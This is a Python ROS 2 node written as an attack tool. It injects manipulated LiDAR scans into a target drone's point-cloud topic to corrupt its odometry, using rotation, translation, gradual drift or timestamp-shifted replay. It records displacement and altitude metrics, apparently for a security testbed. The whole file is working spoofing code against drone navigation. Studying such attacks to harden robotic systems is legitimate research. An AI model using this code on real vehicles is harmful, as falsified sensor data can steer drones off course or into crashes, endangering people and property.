#!/usr/bin/env python3
"""
Layer 2 Attack: LiDAR Scan Manipulation — Odometry Corruption via MITM
Usage:
  ros2 run swarm_mission lidar_manipulator --ros-args \
    -p target_drone:=drone1 \
    -p mode:=drift \
    -p drift_rate_deg:=1.0 \
    -p attack_duration:=60.0

Output:
  - CSV: ~/lidar_manip_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import struct
import time
from collections import deque
from datetime import datetime

import numpy as np
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from sensor_msgs.msg import PointCloud2, PointField, Imu
from geometry_msgs.msg import PoseStamped


class LidarManipulator(Node):
    def __init__(self):
        super().__init__('lidar_manipulator')

        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'drift')            # rotate | translate | drift | replay
        self.declare_parameter('baseline_duration', 10.0)
        self.declare_parameter('attack_duration', 60.0)
        self.declare_parameter('recovery_duration', 30.0)

        # Rotate mode params
        self.declare_parameter('rotate_deg', 15.0)          # degrees around Z axis

        # Translate mode params
        self.declare_parameter('translate_x', 2.0)          # meters in sensor frame
        self.declare_parameter('translate_y', 0.0)
        self.declare_parameter('translate_z', 0.0)

        # Drift mode params (gradual increase per second)
        self.declare_parameter('drift_rate_deg', 1.0)       # degrees per second rotation
        self.declare_parameter('drift_rate_x', 0.05)        # meters per second translation
        self.declare_parameter('drift_rate_y', 0.0)
        self.declare_parameter('drift_rate_z', 0.0)
        self.declare_parameter('drift_type', 'rotate')      # rotate | translate | both

        # Replay mode params
        self.declare_parameter('replay_delay', 5.0)         # seconds of delay

        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.attack_mode = self.get_parameter('mode').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.rotate_deg = self.get_parameter('rotate_deg').value
        self.translate_x = self.get_parameter('translate_x').value
        self.translate_y = self.get_parameter('translate_y').value
        self.translate_z = self.get_parameter('translate_z').value
        self.drift_rate_deg = self.get_parameter('drift_rate_deg').value
        self.drift_rate_x = self.get_parameter('drift_rate_x').value
        self.drift_rate_y = self.get_parameter('drift_rate_y').value
        self.drift_rate_z = self.get_parameter('drift_rate_z').value
        self.drift_type = self.get_parameter('drift_type').value
        self.replay_delay = self.get_parameter('replay_delay').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        self.lidar_topic = f'/{self.target_drone}/lidar/points'

        if self.target_drone == 'drone1':
            self.local_pos_topic = '/mavros/local_position/pose'
        else:
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.attack_start_time = None
        self.drone_pose = None
        self.attack_origin = None
        self.inject_count = 0
        self.scan_count = 0

        # Replay buffer
        self.replay_buffer = deque()

        # Metrics
        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        # Subscribe to real LiDAR
        self.lidar_sub = self.create_subscription(
            PointCloud2, self.lidar_topic,
            self.lidar_callback, qos_besteffort)

        # Monitor drone position
        self.pose_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic,
            self.pose_callback, qos_besteffort)

        # Publisher — publishes manipulated scans on the SAME topic
        self.pc_pub = self.create_publisher(
            PointCloud2, self.lidar_topic, qos_besteffort)

        # Phase timer
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # CSV
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'lidar_manip_metrics_{self.target_drone}_{timestamp_str}.csv')

        mode_desc = {
            'rotate': f'ROTATE ({self.rotate_deg}° around Z)',
            'translate': f'TRANSLATE (+{self.translate_x},{self.translate_y},{self.translate_z}m)',
            'drift': f'DRIFT ({self.drift_type}: {self.drift_rate_deg}°/s rot, '
                     f'{self.drift_rate_x}m/s trans)',
            'replay': f'REPLAY ({self.replay_delay}s delay)',
        }.get(self.attack_mode, self.attack_mode)

        self.get_logger().info(
            f'=== LiDAR Scan Manipulation Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  LiDAR topic: {self.lidar_topic}\n'
            f'  Mode: {mode_desc}\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    def lidar_callback(self, msg: PointCloud2):
        """Process each incoming real LiDAR scan."""
        self.scan_count += 1

        if self.phase != 'attack':
            # Buffer scans for replay mode during baseline
            if self.attack_mode == 'replay':
                self.replay_buffer.append((time.monotonic(), msg))
                # Keep only replay_delay seconds of history
                cutoff = time.monotonic() - self.replay_delay - 5.0
                while self.replay_buffer and self.replay_buffer[0][0] < cutoff:
                    self.replay_buffer.popleft()
            return

        # ---- Attack phase: manipulate and republish ----
        attack_elapsed = time.monotonic() - self.attack_start_time

        if self.attack_mode == 'replay':
            self._handle_replay(msg, attack_elapsed)
        else:
            self._handle_transform(msg, attack_elapsed)

    def _handle_transform(self, msg, attack_elapsed):
        """Transform the real scan and republish."""
        # Parse point cloud into xyz arrays
        xyz = self._parse_xyz(msg)
        if xyz is None or len(xyz) == 0:
            return

        x, y, z = xyz

        # Compute transformation based on mode
        if self.attack_mode == 'rotate':
            angle_rad = math.radians(self.rotate_deg)
            x_new, y_new = self._rotate_z(x, y, angle_rad)
            z_new = z
            transform_desc = f'{self.rotate_deg:.1f}°'

        elif self.attack_mode == 'translate':
            x_new = x + self.translate_x
            y_new = y + self.translate_y
            z_new = z + self.translate_z
            transform_desc = f'+({self.translate_x},{self.translate_y},{self.translate_z})m'

        elif self.attack_mode == 'drift':
            # Gradual increase over time
            if self.drift_type in ('rotate', 'both'):
                angle_rad = math.radians(self.drift_rate_deg * attack_elapsed)
                x_new, y_new = self._rotate_z(x, y, angle_rad)
            else:
                x_new, y_new = x.copy(), y.copy()

            if self.drift_type in ('translate', 'both'):
                x_new = x_new + self.drift_rate_x * attack_elapsed
                y_new = y_new + self.drift_rate_y * attack_elapsed
                z_new = z + self.drift_rate_z * attack_elapsed
            else:
                z_new = z

            current_deg = self.drift_rate_deg * attack_elapsed
            current_trans = self.drift_rate_x * attack_elapsed
            transform_desc = f'{current_deg:.1f}° / {current_trans:.2f}m'
        else:
            return

        # Rebuild point cloud with transformed coordinates
        modified_data = self._rebuild_pointcloud(msg, x_new, y_new, z_new)

        # Publish
        out = PointCloud2()
        out.header = msg.header  # keep original timestamp and frame
        out.height = msg.height
        out.width = msg.width
        out.fields = msg.fields
        out.is_bigendian = msg.is_bigendian
        out.point_step = msg.point_step
        out.row_step = msg.row_step
        out.data = modified_data
        out.is_dense = msg.is_dense

        self.pc_pub.publish(out)
        self.inject_count += 1

        if self.inject_count % 10 == 1:
            self.get_logger().info(
                f'Scan #{self.inject_count}: {msg.width} pts, '
                f'transform: {transform_desc}')

    def _handle_replay(self, msg, attack_elapsed):
        """Replay old scans with current timestamps."""
        # Buffer current scan
        self.replay_buffer.append((time.monotonic(), msg))

        # Find scan from replay_delay seconds ago
        target_time = time.monotonic() - self.replay_delay
        old_msg = None
        for t, m in self.replay_buffer:
            if t <= target_time:
                old_msg = m
            else:
                break

        if old_msg is None:
            return

        # Republish old scan with current timestamp
        out = PointCloud2()
        out.header.stamp = msg.header.stamp  # current timestamp
        out.header.frame_id = msg.header.frame_id
        out.height = old_msg.height
        out.width = old_msg.width
        out.fields = old_msg.fields
        out.is_bigendian = old_msg.is_bigendian
        out.point_step = old_msg.point_step
        out.row_step = old_msg.row_step
        out.data = old_msg.data
        out.is_dense = old_msg.is_dense

        self.pc_pub.publish(out)
        self.inject_count += 1

        # Clean old entries
        cutoff = time.monotonic() - self.replay_delay - 5.0
        while self.replay_buffer and self.replay_buffer[0][0] < cutoff:
            self.replay_buffer.popleft()

    # ---- Point cloud manipulation helpers ----

    def _parse_xyz(self, msg):
        """Extract x, y, z float32 arrays from PointCloud2."""
        n = msg.width * msg.height
        if n == 0:
            return None

        # Find field offsets
        field_map = {f.name: f.offset for f in msg.fields}
        x_off = field_map.get('x', 0)
        y_off = field_map.get('y', 4)
        z_off = field_map.get('z', 8)

        data = np.frombuffer(msg.data, dtype=np.uint8)
        ps = msg.point_step

        x = np.frombuffer(data, dtype=np.float32,
                          count=n, offset=x_off)
        # Can't use simple offset for strided access, need manual extraction
        x = np.array([struct.unpack_from('<f', msg.data, i * ps + x_off)[0]
                       for i in range(n)], dtype=np.float32)
        y = np.array([struct.unpack_from('<f', msg.data, i * ps + y_off)[0]
                       for i in range(n)], dtype=np.float32)
        z = np.array([struct.unpack_from('<f', msg.data, i * ps + z_off)[0]
                       for i in range(n)], dtype=np.float32)

        return x, y, z

    def _rotate_z(self, x, y, angle_rad):
        """Rotate x, y arrays around Z axis."""
        cos_a = np.float32(math.cos(angle_rad))
        sin_a = np.float32(math.sin(angle_rad))
        x_new = x * cos_a - y * sin_a
        y_new = x * sin_a + y * cos_a
        return x_new, y_new

    def _rebuild_pointcloud(self, msg, x_new, y_new, z_new):
        """Replace x, y, z in the original point cloud data."""
        n = msg.width * msg.height
        ps = msg.point_step

        field_map = {f.name: f.offset for f in msg.fields}
        x_off = field_map.get('x', 0)
        y_off = field_map.get('y', 4)
        z_off = field_map.get('z', 8)

        # Copy original data (preserves intensity, ring, time, etc.)
        data = bytearray(msg.data)

        for i in range(n):
            base = i * ps
            struct.pack_into('<f', data, base + x_off, x_new[i])
            struct.pack_into('<f', data, base + y_off, y_new[i])
            struct.pack_into('<f', data, base + z_off, z_new[i])

        return bytes(data)

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        displacement = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            displacement = math.sqrt(dx**2 + dy**2 + dz**2)

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now

            # Current transform magnitude
            attack_elapsed = (now - self.attack_start_time
                              if self.attack_start_time else 0)
            current_rot = 0.0
            current_trans = 0.0
            if self.phase == 'attack' and self.attack_mode == 'drift':
                current_rot = self.drift_rate_deg * attack_elapsed
                current_trans = self.drift_rate_x * attack_elapsed

            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'inject_count': self.inject_count,
                'scan_count': self.scan_count,
                'displacement_m': round(displacement, 3) if displacement is not None else None,
                'current_rotation_deg': round(current_rot, 2),
                'current_translation_m': round(current_trans, 3),
            }
            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {
                'baseline': '[B]', 'attack': '[A]', 'recovery': '[R]'
            }.get(self.phase, '[?]')

            pos_str = ''
            if self.drone_pose is not None:
                pos_str = (f'pos: ({self.drone_pose.position.x:.1f}, '
                           f'{self.drone_pose.position.y:.1f}, '
                           f'{self.drone_pose.position.z:.1f})')

            disp_str = f'disp: {displacement:.2f}m' if displacement is not None else ''

            transform_str = ''
            if self.phase == 'attack' and self.attack_mode == 'drift':
                transform_str = f'rot: {current_rot:.1f}° trans: {current_trans:.2f}m'

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | {pos_str} | '
                f'{disp_str} | {transform_str} | '
                f'scans: {self.scan_count} injected: {self.inject_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()
        self.attack_start_time = time.monotonic()

        if self.drone_pose is not None:
            from geometry_msgs.msg import Pose
            self.attack_origin = Pose()
            self.attack_origin.position.x = self.drone_pose.position.x
            self.attack_origin.position.y = self.drone_pose.position.y
            self.attack_origin.position.z = self.drone_pose.position.z

        self.get_logger().warn(
            f'=== ATTACK PHASE — {self.attack_mode.upper()} scan manipulation ===\n'
            f'  Every real scan will be transformed and republished')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()
        self.get_logger().warn('=== RECOVERY PHASE — Manipulation stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()
        self._write_csv()

        attack_disps = [m['displacement_m'] for m in self.metrics
                        if m['phase'] == 'attack' and m['displacement_m'] is not None]
        max_disp = max(attack_disps) if attack_disps else 0
        final_disp = attack_disps[-1] if attack_disps else 0

        min_z = None
        for m in self.metrics:
            if m['phase'] in ('attack', 'recovery') and 'drone_z' in m:
                if min_z is None or m['drone_z'] < min_z:
                    min_z = m['drone_z']

        min_z_str = f'{min_z:>6.2f}m' if min_z is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════════╗\n'
            f'║     LIDAR SCAN MANIPULATION RESULTS            ║\n'
            f'╠═══════════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<38}║\n'
            f'║ Mode: {self.attack_mode:<40}║\n'
            f'║ Scans received:         {self.scan_count:>6d}                ║\n'
            f'║ Scans injected:         {self.inject_count:>6d}                ║\n'
            f'║ Max displacement:       {max_disp:>6.2f}m               ║\n'
            f'║ Final attack disp:      {final_disp:>6.2f}m               ║\n'
            f'║ Min altitude:           {min_z_str}               ║\n'
            f'╚═══════════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s', 'inject_count',
                      'scan_count', 'displacement_m',
                      'current_rotation_deg', 'current_translation_m',
                      'drone_x', 'drone_y', 'drone_z']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames,
                                        extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(
                f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = LidarManipulator()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.inject_count} manipulated scans published')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
